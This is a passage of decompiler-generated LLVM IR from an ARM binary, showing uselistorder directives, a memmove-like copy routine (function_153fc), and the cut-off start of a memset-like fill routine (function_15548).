  uselistorder i32 %v0_15318, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_152b8, { 0, 2, 1 }
  uselistorder i32 %v17_15270, { 1, 0, 2 }
  uselistorder i32 %v14_15270, { 1, 0, 2 }
  uselistorder i32 %v11_15270, { 1, 0, 2 }
  uselistorder i32 %v8_15270, { 1, 0, 2 }
  uselistorder i32 %v5_15270, { 1, 0, 2 }
  uselistorder i32 %v2_15270, { 1, 0, 2 }
  uselistorder i32 %v1_1527c, { 1, 0, 2 }
  uselistorder i32 %v0_15270, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_15274, { 1, 0 }
  uselistorder i32 %v0_152b8, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15258, { 0, 2, 1, 5, 3, 4 }
  uselistorder i32 %v1_15250, { 2, 0, 1, 3, 5, 4 }
  uselistorder i32 %v0_15250, { 1, 0 }
  uselistorder i32 %v0_152b838, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15244, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_15240, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1522831, { 1, 0 }
  uselistorder i32 %v4_15214, { 1, 0 }
  uselistorder i32 %v4_1520c, { 1, 0 }
  uselistorder i32 %v6_15208, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_151f4, { 1, 0 }
  uselistorder i32 %v1_151ec, { 1, 2, 0 }
  uselistorder i32 %v3_151b0, { 1, 0, 2 }
  uselistorder i1 %v4_151ac, { 1, 0, 2 }
  uselistorder i32 %v3_151ac, { 1, 0 }
  uselistorder i32 %v2_151b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_151a897, { 2, 1, 0 }
  uselistorder i32 %v13_151a4, { 1, 0, 2 }
  uselistorder i32 %v1_151a0, { 2, 1, 0 }
  uselistorder i1 %v4_15198, { 0, 2, 1, 3 }
  uselistorder i32 %v3_15198, { 1, 0 }
  uselistorder i32 %v0_15198, { 0, 2, 1 }
  uselistorder i32 %v1_151a4, { 1, 0, 6, 5, 4, 3, 2 }
  uselistorder i32 %v24_15184, { 0, 2, 1 }
  uselistorder i32 %v0_15180, { 1, 0 }
  uselistorder i32 %v0_15184, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15174, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_15174, { 1, 0 }
  uselistorder i32 %v0_1518464, { 1, 0 }
  uselistorder i32 %v1_1516092, { 2, 1, 0 }
  uselistorder i32 %v13_1515c, { 1, 0, 2 }
  uselistorder i32 %v1_15158, { 2, 1, 0 }
  uselistorder i1 %v4_15150, { 0, 2, 1, 3 }
  uselistorder i32 %v3_15150, { 1, 0 }
  uselistorder i32 %v0_15174.pre, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v1_15140, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_1512c, { 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 %v1_1515c, { 6, 3, 0, 13, 14, 2, 5, 4, 11, 10, 9, 8, 7, 12, 1 }
  uselistorder i32 %v6_15120, { 1, 0, 2 }
  uselistorder i32 %v1_15118, { 0, 2, 1 }
  uselistorder i32 %v1_15104, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15100, { 1, 2, 0 }
  uselistorder i32 %v0_15100, { 0, 2, 1, 3 }
  uselistorder i32 %v11_150f0, { 1, 0 }
  uselistorder i32 %v8_150f0, { 2, 1, 0 }
  uselistorder i32 %v3_150f0, { 2, 3, 7, 0, 1, 6, 4, 5, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 23, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 24, 25, 21, 16, 15, 17, 18, 20, 19, 22, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 3, 37, 4, 38, 5, 39, 7, 6, 8, 9, 41, 11, 10, 12, 15, 14, 16, 13, 40, 17, 42, 43, 30, 18, 29, 2, 19, 31, 20, 28, 21, 32, 22, 34, 23, 33, 24, 25, 35, 26, 27, 36, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 38, 6, 39, 7, 8, 9, 40, 10, 41, 11, 42, 12, 13, 14, 15, 43, 35, 36, 37, 44, 45, 33, 16, 17, 29, 18, 30, 3, 28, 19, 20, 21, 22, 31, 23, 24, 25, 26, 27, 32, 34, 0, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 4, 3, 6, 7, 5, 8, 10, 9, 11 }
  uselistorder i1* %cpsr_n.global-to-local, { 7, 8, 9, 10, 1, 11, 4, 3, 2, 12, 13, 14, 5, 6, 30, 31, 32, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 5, 7, 8, 11, 9, 10, 12, 1, 13, 4, 3, 2, 14, 15, 16, 17, 28, 29, 30, 31, 34, 32, 33, 35, 18, 19, 20, 0, 21, 22, 23, 25, 24, 26, 27 }
  uselistorder i8 0, { 4, 17, 18, 11, 19, 20, 0, 7, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 40, 42, 39, 12, 41, 13, 43, 44, 38, 2, 15, 45, 46, 50, 47, 48, 49, 14, 51, 52, 53, 54, 55, 3, 56, 16, 57, 58, 59, 61, 62, 6, 65, 66, 67, 10, 63, 64, 8, 68, 69, 70, 9, 71, 5, 72, 73, 60, 74, 75, 76, 77 }
  uselistorder label %.thread17, { 3, 2, 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %dec_label_pc_153cc, { 2, 0, 1 }
  uselistorder label %.thread15, { 5, 4, 3, 1, 2, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %thread-pre-split12._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15394, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_152cc, { 1, 0 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %dec_label_pc_1526c, { 1, 0 }
  uselistorder label %dec_label_pc_15228, { 1, 0 }
  uselistorder label %.thread10, { 6, 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb150, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread108, { 2, 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %.thread98, { 2, 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_15190, { 1, 0 }
  uselistorder label %dec_label_pc_1517c, { 1, 0 }
  uselistorder label %dec_label_pc_15174, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread93, { 2, 1, 0 }
  uselistorder label %bb135, { 1, 0 }
  uselistorder label %.thread2, { 4, 3, 1, 0, 2 }
  uselistorder label %bb132, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
}

define i32 @function_153fc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_153fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp21 = ptrtoint i8* %arg1 to i32
  %v3_153fc = load i32, i32* @r4, align 4
  %v6_153fc = load i32, i32* @r5, align 4
  %v9_153fc = load i32, i32* @r6, align 4
  %v12_153fc = load i32, i32* @r7, align 4
  %v15_153fc = load i32, i32* @lr, align 4
  %v5_15400 = icmp ugt i8* %tmp, %arg1
  %v11_15400 = icmp eq i8* %tmp, %arg1
  store i1 %v11_15400, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp21, i32* @r5, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg3, i32* @ip, align 4
  store i32 %tmp21, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v11_15400, label %dec_label_pc_15440, label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_153fc
  %v3_15420 = add i32 %arg3, %arg2
  store i32 %v3_15420, i32* @r3, align 4
  %v4_15424 = icmp ult i32 %tmp21, %v3_15420
  %v10_15424 = icmp eq i32 %tmp21, %v3_15420
  store i1 %v10_15424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_15424, label %dec_label_pc_1542c, label %dec_label_pc_15438

dec_label_pc_1542c:                               ; preds = %dec_label_pc_15420
  %v3_1542c = add i32 %tmp21, %arg3
  store i32 %v3_1542c, i32* @r7, align 4
  %v4_15430 = icmp ugt i32 %v3_1542c, %arg2
  %v10_15430 = icmp eq i32 %v3_1542c, %arg2
  store i1 %v10_15430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_15430, label %dec_label_pc_15450, label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_1542c, %dec_label_pc_15420
  %tmp29 = bitcast i8* %arg1 to i16*
  %v6_15438 = call i32 @function_150f0(i16* %tmp29, i32 %arg2, i32 %arg3)
  store i32 %v6_15438, i32* @r5, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_154cc, %dec_label_pc_154bc, %dec_label_pc_15510, %dec_label_pc_15470, %dec_label_pc_1549c, %dec_label_pc_15494, %dec_label_pc_15468, %dec_label_pc_153fc, %dec_label_pc_15438
  %v0_15440 = load i32, i32* @r5, align 4
  store i32 %v3_153fc, i32* @r4, align 4
  store i32 %v6_153fc, i32* @r5, align 4
  store i32 %v9_153fc, i32* @r6, align 4
  store i32 %v12_153fc, i32* @r7, align 4
  store i32 %v15_153fc, i32* @lr, align 4
  ret i32 %v0_15440

dec_label_pc_15450:                               ; preds = %dec_label_pc_1542c
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v2_15484 = urem i32 %arg2, 4
  br i1 %v5_15400, label %dec_label_pc_15458, label %dec_label_pc_15484

dec_label_pc_15458:                               ; preds = %dec_label_pc_15450
  %v2_1545c = urem i32 %tmp21, 4
  %v9_15460 = icmp eq i32 %v2_15484, %v2_1545c
  store i1 %v9_15460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15460, label %dec_label_pc_15508, label %dec_label_pc_15468

dec_label_pc_15468.loopexit:                      ; preds = %dec_label_pc_15530
  store i1 %v7_15538, i1* %cpsr_z.global-to-local, align 1
  %v0_15468.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15468

dec_label_pc_15468:                               ; preds = %dec_label_pc_15468.loopexit, %dec_label_pc_15528, %dec_label_pc_15458
  %v2_1547812 = phi i32 [ %v4_1553c, %dec_label_pc_15468.loopexit ], [ %v1_1553c8, %dec_label_pc_15528 ], [ %tmp21, %dec_label_pc_15458 ]
  %v0_15468 = phi i32 [ %v0_15468.pre, %dec_label_pc_15468.loopexit ], [ %v0_15528, %dec_label_pc_15528 ], [ %arg3, %dec_label_pc_15458 ]
  %v2_15468 = icmp eq i32 %v0_15468, 0
  store i1 %v2_15468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15468, label %dec_label_pc_15440, label %dec_label_pc_15470

dec_label_pc_15470:                               ; preds = %dec_label_pc_15468, %dec_label_pc_15470.dec_label_pc_15470_crit_edge
  %v2_15478 = phi i32 [ %v5_15478, %dec_label_pc_15470.dec_label_pc_15470_crit_edge ], [ %v2_1547812, %dec_label_pc_15468 ]
  %v0_15474 = phi i32 [ %v0_15474.pre, %dec_label_pc_15470.dec_label_pc_15470_crit_edge ], [ %v0_15468, %dec_label_pc_15468 ]
  %v0_15470 = load i32, i32* @r6, align 4
  %v1_15470 = inttoptr i32 %v0_15470 to i8*
  %v2_15470 = load i8, i8* %v1_15470, align 1
  %v5_15470 = add i32 %v0_15470, 1
  store i32 %v5_15470, i32* @r6, align 4
  %v1_15474 = add i32 %v0_15474, -1
  store i32 %v1_15474, i32* @ip, align 4
  %v7_15474 = icmp eq i32 %v0_15474, 1
  store i1 %v7_15474, i1* %cpsr_z.global-to-local, align 1
  %v3_15478 = inttoptr i32 %v2_15478 to i8*
  store i8 %v2_15470, i8* %v3_15478, align 1
  %v4_15478 = load i32, i32* @r4, align 4
  %v5_15478 = add i32 %v4_15478, 1
  store i32 %v5_15478, i32* @r4, align 4
  %v0_1547c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1547c, label %dec_label_pc_15440, label %dec_label_pc_15470.dec_label_pc_15470_crit_edge

dec_label_pc_15470.dec_label_pc_15470_crit_edge:  ; preds = %dec_label_pc_15470
  %v0_15474.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15470

dec_label_pc_15484:                               ; preds = %dec_label_pc_15450
  store i32 %v2_15484, i32* %r2.global-to-local, align 4
  %v2_15488 = urem i32 %tmp21, 4
  %v9_1548c = icmp eq i32 %v2_15484, %v2_15488
  store i1 %v9_1548c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1548c, label %dec_label_pc_154b4, label %dec_label_pc_15494

dec_label_pc_15494.loopexit:                      ; preds = %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge, %dec_label_pc_154f0.preheader
  %v7_154f8.lcssa = phi i1 [ %v7_154f840, %dec_label_pc_154f0.preheader ], [ %v7_154f8, %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge ]
  store i1 %v7_154f8.lcssa, i1* %cpsr_z.global-to-local, align 1
  %v0_15494.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_15494.loopexit, %dec_label_pc_154e8, %dec_label_pc_15484
  %v0_15494 = phi i32 [ %v0_15494.pre, %dec_label_pc_15494.loopexit ], [ %v0_154e8, %dec_label_pc_154e8 ], [ %arg3, %dec_label_pc_15484 ]
  %v2_15494 = icmp eq i32 %v0_15494, 0
  store i1 %v2_15494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15494, label %dec_label_pc_15440, label %dec_label_pc_1549c

dec_label_pc_1549c:                               ; preds = %dec_label_pc_15494, %dec_label_pc_1549c.dec_label_pc_1549c_crit_edge
  %v0_1549c = phi i32 [ %v0_1549c.pre, %dec_label_pc_1549c.dec_label_pc_1549c_crit_edge ], [ %v0_15494, %dec_label_pc_15494 ]
  %v1_1549c = add i32 %v0_1549c, -1
  store i32 %v1_1549c, i32* @ip, align 4
  %v1_154a0 = load i32, i32* @lr, align 4
  %v2_154a0 = add i32 %v1_154a0, %v1_1549c
  %v3_154a0 = inttoptr i32 %v2_154a0 to i8*
  %v4_154a0 = load i8, i8* %v3_154a0, align 1
  %v2_154a4 = icmp eq i32 %v1_1549c, 0
  store i1 %v2_154a4, i1* %cpsr_z.global-to-local, align 1
  %v3_154a8 = load i32, i32* @r5, align 4
  %v4_154a8 = add i32 %v3_154a8, %v1_1549c
  %v5_154a8 = inttoptr i32 %v4_154a8 to i8*
  store i8 %v4_154a0, i8* %v5_154a8, align 1
  %v0_154ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154ac, label %dec_label_pc_15440, label %dec_label_pc_1549c.dec_label_pc_1549c_crit_edge

dec_label_pc_1549c.dec_label_pc_1549c_crit_edge:  ; preds = %dec_label_pc_1549c
  %v0_1549c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1549c

dec_label_pc_154b4:                               ; preds = %dec_label_pc_15484
  %v1_154b4 = urem i32 %v3_1542c, 4
  %v2_154b4 = icmp eq i32 %v1_154b4, 0
  store i1 %v2_154b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154b4, label %dec_label_pc_154e8, label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %dec_label_pc_154b4
  %v1_154bc = add i32 %arg3, -1
  store i32 %v1_154bc, i32* @ip, align 4
  %v2_154bc = icmp eq i32 %arg3, 0
  %v7_154bc = icmp eq i32 %arg3, 1
  store i1 %v7_154bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154bc, label %dec_label_pc_15440, label %dec_label_pc_154d4.preheader

dec_label_pc_154d4.preheader:                     ; preds = %dec_label_pc_154bc
  %v4_154c0 = add i32 %v1_154bc, %tmp21
  store i32 %v4_154c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_154d4

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154d4
  %v1_154cc = add i32 %v0_154e8.pre, -1
  store i32 %v1_154cc, i32* @ip, align 4
  %v2_154cc = icmp eq i32 %v0_154e8.pre, 0
  %v7_154cc = icmp eq i32 %v0_154e8.pre, 1
  store i1 %v7_154cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154cc, label %dec_label_pc_15440, label %dec_label_pc_154cc.dec_label_pc_154d4_crit_edge

dec_label_pc_154cc.dec_label_pc_154d4_crit_edge:  ; preds = %dec_label_pc_154cc
  %v1_154d4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154cc.dec_label_pc_154d4_crit_edge, %dec_label_pc_154d4.preheader
  %v0_154d8 = phi i32 [ %v4_154c0, %dec_label_pc_154d4.preheader ], [ %v1_154e0, %dec_label_pc_154cc.dec_label_pc_154d4_crit_edge ]
  %v1_154d4 = phi i32 [ %arg2, %dec_label_pc_154d4.preheader ], [ %v1_154d4.pre, %dec_label_pc_154cc.dec_label_pc_154d4_crit_edge ]
  %v0_154d4 = phi i32 [ %v1_154bc, %dec_label_pc_154d4.preheader ], [ %v1_154cc, %dec_label_pc_154cc.dec_label_pc_154d4_crit_edge ]
  %v2_154d4 = add i32 %v0_154d4, %v1_154d4
  %v3_154d4 = inttoptr i32 %v2_154d4 to i8*
  %v4_154d4 = load i8, i8* %v3_154d4, align 1
  %v1_154d8 = urem i32 %v0_154d8, 4
  %v2_154d8 = icmp eq i32 %v1_154d8, 0
  store i1 %v2_154d8, i1* %cpsr_z.global-to-local, align 1
  %v3_154dc = inttoptr i32 %v0_154d8 to i8*
  store i8 %v4_154d4, i8* %v3_154dc, align 1
  %v0_154e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_154e0 = add i32 %v0_154e0, -1
  store i32 %v1_154e0, i32* %r2.global-to-local, align 4
  %v0_154e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_154e8.pre = load i32, i32* @ip, align 4
  br i1 %v0_154e4, label %dec_label_pc_154e8, label %dec_label_pc_154cc

dec_label_pc_154e8:                               ; preds = %dec_label_pc_154d4, %dec_label_pc_154b4
  %v0_154e8 = phi i32 [ %arg3, %dec_label_pc_154b4 ], [ %v0_154e8.pre, %dec_label_pc_154d4 ]
  %v7_154e8 = icmp eq i32 %v0_154e8, 3
  store i1 %v7_154e8, i1* %cpsr_z.global-to-local, align 1
  %tmp53 = icmp ult i32 %v0_154e8, 4
  br i1 %tmp53, label %dec_label_pc_15494, label %dec_label_pc_154f0.preheader

dec_label_pc_154f0.preheader:                     ; preds = %dec_label_pc_154e8
  %v1_154f034 = add i32 %v0_154e8, -4
  store i32 %v1_154f034, i32* @ip, align 4
  %v1_154f435 = load i32, i32* @lr, align 4
  %v2_154f436 = add i32 %v1_154f435, %v1_154f034
  %v3_154f437 = inttoptr i32 %v2_154f436 to i32*
  %v4_154f438 = load i32, i32* %v3_154f437, align 4
  %v2_154f839 = icmp ugt i32 %v1_154f034, 2
  %v7_154f840 = icmp eq i32 %v1_154f034, 3
  %v2_154fc41 = load i32, i32* @r5, align 4
  %v3_154fc42 = add i32 %v2_154fc41, %v1_154f034
  %v4_154fc43 = inttoptr i32 %v3_154fc42 to i32*
  store i32 %v4_154f438, i32* %v4_154fc43, align 4
  %v2_1550044 = xor i1 %v7_154f840, true
  %v3_1550045 = and i1 %v2_154f839, %v2_1550044
  br i1 %v3_1550045, label %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge, label %dec_label_pc_15494.loopexit

dec_label_pc_154f0.dec_label_pc_154f0_crit_edge:  ; preds = %dec_label_pc_154f0.preheader, %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge
  %v0_154f0.pre = load i32, i32* @ip, align 4
  %v1_154f0 = add i32 %v0_154f0.pre, -4
  store i32 %v1_154f0, i32* @ip, align 4
  %v1_154f4 = load i32, i32* @lr, align 4
  %v2_154f4 = add i32 %v1_154f4, %v1_154f0
  %v3_154f4 = inttoptr i32 %v2_154f4 to i32*
  %v4_154f4 = load i32, i32* %v3_154f4, align 4
  %v2_154f8 = icmp ugt i32 %v1_154f0, 2
  %v7_154f8 = icmp eq i32 %v1_154f0, 3
  %v2_154fc = load i32, i32* @r5, align 4
  %v3_154fc = add i32 %v2_154fc, %v1_154f0
  %v4_154fc = inttoptr i32 %v3_154fc to i32*
  store i32 %v4_154f4, i32* %v4_154fc, align 4
  %v2_15500 = xor i1 %v7_154f8, true
  %v3_15500 = and i1 %v2_154f8, %v2_15500
  br i1 %v3_15500, label %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge, label %dec_label_pc_15494.loopexit

dec_label_pc_15508:                               ; preds = %dec_label_pc_15458
  %v2_15508 = icmp eq i32 %v2_15484, 0
  store i1 %v2_15508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15508, label %dec_label_pc_15528, label %dec_label_pc_15510

dec_label_pc_15510:                               ; preds = %dec_label_pc_15508, %dec_label_pc_15518
  %v2_1551c = phi i32 [ %v5_1551c, %dec_label_pc_15518 ], [ %tmp21, %dec_label_pc_15508 ]
  %v0_15510 = phi i32 [ %v0_15528.pre, %dec_label_pc_15518 ], [ %arg3, %dec_label_pc_15508 ]
  %v1_15510 = add i32 %v0_15510, -1
  store i32 %v1_15510, i32* @ip, align 4
  %v2_15510 = icmp eq i32 %v0_15510, 0
  %v7_15510 = icmp eq i32 %v0_15510, 1
  store i1 %v7_15510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15510, label %dec_label_pc_15440, label %dec_label_pc_15518

dec_label_pc_15518:                               ; preds = %dec_label_pc_15510
  %v0_15518 = load i32, i32* @r6, align 4
  %v1_15518 = inttoptr i32 %v0_15518 to i8*
  %v2_15518 = load i8, i8* %v1_15518, align 1
  %v5_15518 = add i32 %v0_15518, 1
  store i32 %v5_15518, i32* @r6, align 4
  %v3_1551c = inttoptr i32 %v2_1551c to i8*
  store i8 %v2_15518, i8* %v3_1551c, align 1
  %v4_1551c = load i32, i32* @r4, align 4
  %v5_1551c = add i32 %v4_1551c, 1
  store i32 %v5_1551c, i32* @r4, align 4
  %v1_15520 = urem i32 %v5_1551c, 4
  %v2_15520 = icmp eq i32 %v1_15520, 0
  store i1 %v2_15520, i1* %cpsr_z.global-to-local, align 1
  %v0_15528.pre = load i32, i32* @ip, align 4
  br i1 %v2_15520, label %dec_label_pc_15528, label %dec_label_pc_15510

dec_label_pc_15528:                               ; preds = %dec_label_pc_15518, %dec_label_pc_15508
  %v1_1553c8 = phi i32 [ %tmp21, %dec_label_pc_15508 ], [ %v5_1551c, %dec_label_pc_15518 ]
  %v0_15528 = phi i32 [ %arg3, %dec_label_pc_15508 ], [ %v0_15528.pre, %dec_label_pc_15518 ]
  %v7_15528 = icmp eq i32 %v0_15528, 3
  store i1 %v7_15528, i1* %cpsr_z.global-to-local, align 1
  %tmp54 = icmp ult i32 %v0_15528, 4
  br i1 %tmp54, label %dec_label_pc_15468, label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %dec_label_pc_15528, %dec_label_pc_15530.dec_label_pc_15530_crit_edge
  %v1_1553c = phi i32 [ %v4_1553c, %dec_label_pc_15530.dec_label_pc_15530_crit_edge ], [ %v1_1553c8, %dec_label_pc_15528 ]
  %v0_15530 = phi i32 [ %v0_15530.pre, %dec_label_pc_15530.dec_label_pc_15530_crit_edge ], [ %v0_15528, %dec_label_pc_15528 ]
  %v1_15530 = add i32 %v0_15530, -4
  store i32 %v1_15530, i32* @ip, align 4
  %v0_15534 = load i32, i32* @r6, align 4
  %v1_15534 = inttoptr i32 %v0_15534 to i32*
  %v2_15534 = load i32, i32* %v1_15534, align 4
  %v4_15534 = add i32 %v0_15534, 4
  store i32 %v4_15534, i32* @r6, align 4
  %v2_15538 = icmp ugt i32 %v1_15530, 2
  %v7_15538 = icmp eq i32 %v1_15530, 3
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  store i32 %v2_15534, i32* %v2_1553c, align 4
  %v3_1553c = load i32, i32* @r4, align 4
  %v4_1553c = add i32 %v3_1553c, 4
  store i32 %v4_1553c, i32* @r4, align 4
  %v2_15540 = xor i1 %v7_15538, true
  %v3_15540 = and i1 %v2_15538, %v2_15540
  br i1 %v3_15540, label %dec_label_pc_15530.dec_label_pc_15530_crit_edge, label %dec_label_pc_15468.loopexit

dec_label_pc_15530.dec_label_pc_15530_crit_edge:  ; preds = %dec_label_pc_15530
  %v0_15530.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15530

; uselistorder directives
  uselistorder i32 %v4_1553c, { 2, 0, 1 }
  uselistorder i32 %v0_15528, { 1, 0, 3, 2 }
  uselistorder i32 %v5_1551c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_15510, { 0, 2, 1 }
  uselistorder i32 %v1_154f0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_154e8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_154e8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_154e0, { 1, 0 }
  uselistorder i32 %v0_154d8, { 1, 0 }
  uselistorder i32 %v1_154bc, { 1, 0, 2 }
  uselistorder i32 %v1_1549c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_15478, { 1, 0 }
  uselistorder i32 %v2_15484, { 3, 1, 0, 2 }
  uselistorder i32 %tmp21, { 5, 2, 4, 0, 6, 1, 3, 8, 7, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg3, { 3, 0, 4, 6, 8, 7, 5, 9, 10, 1, 2, 11, 12 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15530, { 1, 0 }
  uselistorder label %dec_label_pc_15510, { 1, 0 }
  uselistorder label %dec_label_pc_154f0.dec_label_pc_154f0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1549c, { 1, 0 }
  uselistorder label %dec_label_pc_15494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15470, { 1, 0 }
  uselistorder label %dec_label_pc_15468, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15440, { 2, 0, 1, 4, 5, 3, 6, 8, 7 }
}

define i32 @function_15548(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15548:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15548 = icmp eq i32 %arg3, 0
  store i1 %v2_15548, i1* %cpsr_z.global-to-local, align 1
  %v3_1554c = load i32, i32* @r4, align 4
  store i32 %v3_1554c, i32* %stack_var_-20, align 4
  br i1 %v2_15548, label %dec_label_pc_1565c, label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_15548
  %v1_15554 = urem i32 %arg2, 256
  store i32 %v1_15554, i32* @ip, align 4
  %v3_15558 = add i32 %tmp, %arg3
  store i32 %v3_15558, i32* %r2.global-to-local, align 4
  %v2_1555c = icmp ne i32 %arg3, 1
  store i1 %v2_1555c, i1* %cpsr_c.global-to-local, align 1
  %v7_1555c = icmp eq i32 %arg3, 2
  store i1 %v7_1555c, i1* %cpsr_z.global-to-local, align 1
  %v1_15560 = trunc i32 %arg2 to i8
  %v3_15560 = add i32 %v3_15558, -1
  %v4_15560 = inttoptr i32 %v3_15560 to i8*
  store i8 %v1_15560, i8* %v4_15560, align 1
  %v0_15564 = load i32, i32* @ip, align 4
  %v1_15564 = trunc i32 %v0_15564 to i8
  store i8 %v1_15564, i8* %arg1, align 1
  %v0_15568 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_15568 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v2_15568 = xor i1 %v1_15568, true
  %v3_15568 = or i1 %v0_15568, %v2_15568
  br i1 %v3_15568, label %dec_label_pc_1565c, label %dec_label_pc_1556c

